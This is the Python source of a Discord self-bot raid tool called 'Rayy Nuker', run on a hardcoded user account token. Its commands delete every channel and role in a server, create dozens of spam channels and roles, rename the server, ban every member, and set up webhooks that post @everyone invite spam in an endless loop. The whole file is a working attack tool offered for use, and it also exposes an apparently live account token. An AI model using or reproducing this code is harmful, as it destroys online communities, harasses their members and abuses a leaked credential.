import discord, threading, requests,os
from threading import Thread
from discord.ext import commands
from discord import Webhook, AsyncWebhookAdapter
import asyncio
import random
import traceback
import aiohttp
from colorama import Fore
import time
from os import system
system("title " + "Rayy Nuker")
CYAN = Fore.BLUE
White = Fore.WHITE
Red = Fore.RED
White = Fore.WHITE
token = "ODA2ODYxOTExNjU1NTc5NjQ4.YImU6w.ju-P0WoTxm8HcYXNp6bVbq_eWVg"
os.system('pip install discord.py==1.4')
messages=[f"@everyone @everyone https://discord.gg/females", '@everyone @everyone ran https://discord.gg/females']
channels = ['rayy', 'disciples', 'rayy']
web =["ran","beamed", 'disciples', 'rayy']
roles = ['RayyW', 'wizzered', 'solarW']

rayy=commands.Bot(command_prefix='o', self_bot=True)

@rayy.event
async def on_connect():
 print(f'''


{Fore.BLUE}                     ╦═╗╔═╗╦ ╦╦ ╦
{Fore.WHITE}                     ╠╦╝╠═╣╚╦╝╚╦╝
{Fore.BLUE}                     ╩╚═╩ ╩ ╩  ╩

                  {Fore.BLUE}[{White}+{CYAN}]{White} Logged In As : {rayy.user.name}
                  {Fore.BLUE}[{White}+{CYAN}]{White} Users ID : {rayy.user.id}

                  {Fore.BLUE}[{White}+{CYAN}]{White} >b - Bans everyone in the server
                  {Fore.BLUE}[{White}+{CYAN}]{White} >w - Nukes the server
                  {Fore.BLUE}[{White}+{CYAN}]{White} >r - Creates roles
                  {CYAN}[{White}+{CYAN}]{White} >d - Deletes Roles
                  {CYAN}[{White}+{CYAN}]{White} >dm - dmalls
''')
   
@rayy.command()
async def k(ctx):
  await ctx.message.delete()
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
    except:
      pass
  for i in range(45):
    await ctx.guild.create_text_channel(name=random.choice(channels))
  for role in ctx.guild.roles:
    try:
      await role.delete()
    except:
      pass
  for i in range(50):
    await ctx.guild.create_role(name=random.choice(roles))
  for i in range(1):
     await ctx.guild.edit(name=f"discord.gg/females was here")

@rayy.command()
async def r(ctx):
  await ctx.message.delete()
  for role in ctx.guild.roles:
    try:
     for i in range(350):
       await ctx.guild.create_role(name=random.choice(roles))
    except:
         pass

@rayy.command()
async def ball(ctx):
  await ctx.message.delete()
  for users in ctx.guild.members:
      try:
          await ctx.guild.ban(users, reason='ran lol')
          print(f"                  {CYAN}[{White}+{CYAN}]{White} {user} banned")
      except:
          print(f"                  {CYAN}[{White}+{CYAN}]{White} {user} Not Banned")
          pass

@rayy.command()
async def b(ctx):
  await ctx.message.delete()
  ee = 0
  for users in ctx.guild.members:
    try:
      await ctx.guild.ban(users)
      ee += 1
      print(f"                  {CYAN}[{White}+{CYAN}]{White} {users.id} Banned")
    except:
      print(f"                  {CYAN}[{White}+{CYAN}]{White} {users.id} Not Banned")

@rayy.command()
async def ban(ctx):
 await ctx.message.delete()
 for member in ctx.guild.members:
  try:
    await member.ban(reason="beamed")
    print(f"                  {CYAN}[{White}+{CYAN}]{White} Banned {member}")
  except:
    print(f"                  {CYAN}[{White}+{CYAN}]{White} {member} Not Banned")
    continue

@rayy.command()
async def d(ctx):
  await ctx.message.delete()
  for role in ctx.guild.roles:
    try:
      await role.delete()
    except:
      pass

@rayy.command()
async def dc(ctx):
  await ctx.message.delete()
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
    except:
      pass

@rayy.event
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name=random.choice(web))
  webhook_url = webhook.url
  async with aiohttp.ClientSession() as session:
    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
    while True:
      await webhook.send(random.choice(messages), username = random.choice(web))
      print(f'                  {CYAN}[{White}+{CYAN}]{White} Sent Message Using {webhook.id}')


rayy.run(token, bot=False) 
